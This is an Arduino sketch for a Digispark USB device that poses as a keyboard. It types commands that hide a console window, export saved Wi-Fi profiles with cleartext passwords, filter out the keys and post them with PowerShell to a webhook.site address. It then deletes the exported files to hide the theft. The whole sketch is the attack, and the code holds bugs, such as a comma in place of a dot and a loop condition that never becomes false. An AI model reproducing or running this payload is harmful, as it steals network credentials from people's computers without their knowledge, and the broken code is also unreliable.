#include "DigiKeyboard.h"
#define KEY_DOWN 0x51
#define KEY_ENTER 0x28



void setup() {
  pinMode(1, OUTPUT);
}

void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard,delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_M);
  for(int i=0;1<200;i++){
    DigiKeyboard.sendKeyStroke(KEY_DOWN);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Select-String -Path Wi-Fi* -Pattern 'keyMaterial' > Wi-Fi-PASS");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<webhook address> -Method POST -InFile Wi-Fi-PASS");
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("Del Wi-Fi* /s /f /q");
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);

  digitalWrite(1, HIGH);
  DigiKeyboard.delay(9000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
